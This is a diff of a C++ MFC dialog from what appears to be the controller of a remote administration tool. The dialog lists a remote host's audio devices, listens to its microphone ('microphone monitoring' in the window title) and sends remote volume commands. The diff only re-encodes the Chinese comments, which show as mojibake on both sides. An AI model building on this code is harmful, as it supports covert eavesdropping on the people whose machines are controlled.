@@ -1,4 +1,4 @@
-#include "stdafx.h"
+ï»¿#include "stdafx.h"
 #include "Quick.h"
 #include "AudioDlg.h"
 
@@ -28,10 +28,10 @@ CAudioDlg::CAudioDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pCo
 	m_nTotalRecvBytes = 0;
 	m_nTotalSendBytes = 0;
 	m_SelectedDevice = m_SelectedDevice = 0;
-	m_pWavePlayback = new CWavePlayback(&m_ACode);    //³õÊ¼»¯²¥·Å
-	m_pWavePlayback->StartPlay();					//Æô¶¯²¥·ÅÏß³Ì
-	m_pWaveRecord = new CWaveRecord(&m_ACode);		//³õÊ¼»¯»ñÈ¡
-	m_pWaveRecord->SetCommClient(pIOCPServer, pContext,this); //ÉèÖÃ·¢ËÍ
+	m_pWavePlayback = new CWavePlayback(&m_ACode);    //åˆå§‹åŒ–æ’­æ”¾
+	m_pWavePlayback->StartPlay();					//å¯åŠ¨æ’­æ”¾çº¿ç¨‹
+	m_pWaveRecord = new CWaveRecord(&m_ACode);		//åˆå§‹åŒ–èŽ·å–
+	m_pWaveRecord->SetCommClient(pIOCPServer, pContext,this); //è®¾ç½®å‘é€
 
 }
 
@@ -58,7 +58,7 @@ void CAudioDlg::DoDataExchange(CDataExchange* pDX)
 
 BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
 	//{{AFX_MSG_MAP(CAudioDlg)
-	ON_MESSAGE(WM_OPENAUDIODIALOG, OnSendDate)//ÏÂÏß
+	ON_MESSAGE(WM_OPENAUDIODIALOG, OnSendDate)//ä¸‹çº¿
 	//}}AFX_MSG_MAP
 	ON_BN_CLICKED(IDC_BUTTON_RE, &CAudioDlg::OnBnClickedButtonRe)
 	ON_BN_CLICKED(IDC_BUTTON_RE_STOP, &CAudioDlg::OnBnClickedButtonReStop)
@@ -84,12 +84,12 @@ BOOL CAudioDlg::OnInitDialog()
 	SetIcon(m_hIcon, FALSE);		// Set small icon
 
 	CString str;
-	str.Format(_T("Âó¿Ë·ç¼àÌý \\\\%s"), m_pContext->szAddress);
+	str.Format(_T("éº¦å…‹é£Žç›‘å¬ \\\\%s"), m_pContext->szAddress);
 	SetWindowText(str);
 
 
 
-//³õÊ¼»¯Ô¶³ÌÉè±¸ÁÐ±í
+//åˆå§‹åŒ–è¿œç¨‹è®¾å¤‡åˆ—è¡¨
 	WAVE_INFO Wave_Info;
 	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
 	memcpy(&Wave_Info, lpBuffer, sizeof(WAVE_INFO));
@@ -98,7 +98,7 @@ BOOL CAudioDlg::OnInitDialog()
 
 	CString strtemp;
 
-	// '$'Ç°ÎªÊäÈëÉè±¸Ãû  | Ç°ÎªÊäÈëÏßÂ·ÐÅÏ¢
+	// '$'å‰ä¸ºè¾“å…¥è®¾å¤‡å  | å‰ä¸ºè¾“å…¥çº¿è·¯ä¿¡æ¯
 	for (int i = 0; ; i++)
 	{
 
@@ -108,28 +108,28 @@ BOOL CAudioDlg::OnInitDialog()
 
 		strtemp = str.Mid(0, nPos);
 
-		// ²åÈëÉè±¸Ãû
+		// æ’å…¥è®¾å¤‡å
 		m_combo_input_drive.InsertString(i, strtemp);
-		// ½ØÈ¡Ê£ÓàµÄ×Ö·û´®
+		// æˆªå–å‰©ä½™çš„å­—ç¬¦ä¸²
 		str = str.Right(str.GetLength() - nPos - 1);
 
-		// ²éÕÒ ÊäÈëÏßÂ·ÐÅÏ¢
+		// æŸ¥æ‰¾ è¾“å…¥çº¿è·¯ä¿¡æ¯
 		nPos = str.Find('|');
 		if (nPos == -1)
 			continue;
 
-		// ½ØÈ¡
+		// æˆªå–
 		strtemp = str.Mid(0, nPos);
 		str = str.Right(str.GetLength() - nPos - 1);
 
-		// Ìí¼Óµ½Combox
+		// æ·»åŠ åˆ°Combox
 		ShowLinesCombox(strtemp, Wave_Info.nIndex);
 	}
 
 	m_combo_input_drive.SetCurSel(0);
 
 
-	//¿Ø¼þ³õÊ¼»¯
+	//æŽ§ä»¶åˆå§‹åŒ–
 	m_pro_re.SetRange(0, 1000);
 	m_pro_se.SetRange(0, 1000);
 	
@@ -172,7 +172,7 @@ void CAudioDlg::OnReceive()
 		return;
 	if (m_bOnClose) 	return;
 	CString str;
-	str.Format(_T("Âó¿Ë·ç¼àÌý \\\\ %s  [ÊÕ°ü:%d ÊÕ:%d KB] [·¢°ü:%d ·¢:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024 ));
+	str.Format(_T("éº¦å…‹é£Žç›‘å¬ \\\\ %s  [æ”¶åŒ…:%d æ”¶:%d KB] [å‘åŒ…:%d å‘:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024 ));
 	SetWindowText(str);
 }
 
@@ -217,7 +217,7 @@ void CAudioDlg::OnReceiveComplete()
 	break;
 	case TOKEN_STOP_ERROR:
 	{	
-		//MessageBox(_T("¿Í»§ÃüÁîÖ´ÐÐÊ§°Ü"), _T("ÌáÊ¾"));
+		//MessageBox(_T("å®¢æˆ·å‘½ä»¤æ‰§è¡Œå¤±è´¥"), _T("æç¤º"));
 	}
 	break;
 
@@ -230,7 +230,7 @@ void CAudioDlg::OnReceiveComplete()
 	//}
 	//break;
 	default:
-		//MessageBox(_T("´íÎóÃüÁî"), _T("ÌáÊ¾"));
+		//MessageBox(_T("é”™è¯¯å‘½ä»¤"), _T("æç¤º"));
 		return;
 	}
 }
@@ -264,11 +264,11 @@ void CAudioDlg::PostNcDestroy()
 void CAudioDlg::ShowLinesCombox(CString str, int nSelect)
 {
 	CString strtemp;
-	// Çå¿ÕComBox
+	// æ¸…ç©ºComBox
 	m_combo_input_lines.ResetContent();
 	for (int i = 0; ; i++)
 	{
-		// ÊäÈëÏßÂ·ÓÉ @ Çø·Ö
+		// è¾“å…¥çº¿è·¯ç”± @ åŒºåˆ†
 		int nPos = str.Find('@');
 		if (nPos == -1)
 			break;
@@ -276,7 +276,7 @@ void CAudioDlg::ShowLinesCombox(CString str, int nSelect)
 		strtemp = str.Mid(0, nPos);
 		str = str.Right(str.GetLength() - nPos - 1);
 
-		// ²åÈëÊý¾Ý
+		// æ’å…¥æ•°æ®
 		m_combo_input_lines.InsertString(i, strtemp);
 	}
 	m_SelectedLines = nSelect;
@@ -336,7 +336,7 @@ void CAudioDlg::OnBnClickedButtonSe()
 	{
 		GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
 		GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);
-		MessageBox(m_pWaveRecord->GetLastErrorString(), _T("ÌáÊ¾"));
+		MessageBox(m_pWaveRecord->GetLastErrorString(), _T("æç¤º"));
 	}
 }
 
@@ -358,7 +358,7 @@ void CAudioDlg::OnBnClickedButtonSeStop()
 	{
 		GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
 		GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);
-		MessageBox(m_pWaveRecord->GetLastErrorString(), _T("ÌáÊ¾"));
+		MessageBox(m_pWaveRecord->GetLastErrorString(), _T("æç¤º"));
 	}
 }
 
@@ -459,19 +459,19 @@ void CAudioDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
 
 	switch (nSBCode)
 	{
-	case SB_THUMBTRACK: // ÓÃ»§ÍÏ¶¯¹ö¶¯Ìõ
+	case SB_THUMBTRACK: // ç”¨æˆ·æ‹–åŠ¨æ»šåŠ¨æ¡
 		nNewPos = nPos;
 		break;
-	case SB_LINELEFT:   // ×ó±ßµÄ°´Å¥
+	case SB_LINELEFT:   // å·¦è¾¹çš„æŒ‰é’®
 		nNewPos -= 1;
 		break;
-	case SB_LINERIGHT:  // ÓÒ±ßµÄ°´Å¥
+	case SB_LINERIGHT:  // å³è¾¹çš„æŒ‰é’®
 		nNewPos += 1;
 		break;
-	case SB_PAGELEFT:   // °´Ò³ÊýÏò×ó±ß¹ö¶¯
+	case SB_PAGELEFT:   // æŒ‰é¡µæ•°å‘å·¦è¾¹æ»šåŠ¨
 		nNewPos -= scrollinfo.nPage;
 		break;
-	case SB_PAGERIGHT:  // °´Ò³ÊýÏòÓÒ±ß¹ö¶¯
+	case SB_PAGERIGHT:  // æŒ‰é¡µæ•°å‘å³è¾¹æ»šåŠ¨
 		nNewPos += scrollinfo.nPage;
 		break;
 	default:
@@ -491,7 +491,7 @@ void CAudioDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
 	}
 
 	
-	TRACE(_T("%s       scrollinfo £º%d\n"), __FUNCTION__,nNewPos);
+	TRACE(_T("%s       scrollinfo ï¼š%d\n"), __FUNCTION__,nNewPos);
 
 	if (pScrollBar== &m_Scrollbar_r_in)
 	{
@@ -501,7 +501,7 @@ void CAudioDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
 		m_iocpServer->Send(m_pContext, lpPacket, 5);
 		SAFE_DELETE_AR(lpPacket);
 
-		str_CScrollBar.Format(_T("ÐÞ¸ÄÔ¶³Ì¼àÌýÒôÁ¿(%d)"), nNewPos);
+		str_CScrollBar.Format(_T("ä¿®æ”¹è¿œç¨‹ç›‘å¬éŸ³é‡(%d)"), nNewPos);
 		GetDlgItem(IDC_STATIC_R_IN)->SetWindowText(str_CScrollBar);
 	}
 	if (pScrollBar == &m_Scrollbar_r_out)
@@ -511,19 +511,19 @@ void CAudioDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
 		memcpy(lpPacket+1, &nNewPos, 4);
 		m_iocpServer->Send(m_pContext, lpPacket, 5);
 		SAFE_DELETE_AR(lpPacket);
-		str_CScrollBar.Format(_T("ÐÞ¸ÄÔ¶³Ì²¥·ÅÒôÁ¿(%d)"), nNewPos);
+		str_CScrollBar.Format(_T("ä¿®æ”¹è¿œç¨‹æ’­æ”¾éŸ³é‡(%d)"), nNewPos);
 		GetDlgItem(IDC_STATIC_R_OUT)->SetWindowText(str_CScrollBar);
 	}
 	if (pScrollBar == &m_Scrollbar_l_in)
 	{
 		m_pWaveRecord->SetVolume((float)nNewPos);
-		str_CScrollBar.Format(_T("ÐÞ¸Ä±¾µØ·¢ËÍÒôÁ¿(%d)"), nNewPos);
+		str_CScrollBar.Format(_T("ä¿®æ”¹æœ¬åœ°å‘é€éŸ³é‡(%d)"), nNewPos);
 		GetDlgItem(IDC_STATIC_L_IN)->SetWindowText(str_CScrollBar);
 	}
 	if (pScrollBar == &m_Scrollbar_l_out)
 	{
 		m_pWavePlayback->SetVolume((float)nNewPos);
-		str_CScrollBar.Format(_T("ÐÞ¸Ä±¾µØ²¥·ÅÒôÁ¿(%d)"), nNewPos);
+		str_CScrollBar.Format(_T("ä¿®æ”¹æœ¬åœ°æ’­æ”¾éŸ³é‡(%d)"), nNewPos);
 		GetDlgItem(IDC_STATIC_L_OUT)->SetWindowText(str_CScrollBar);
 	}
 
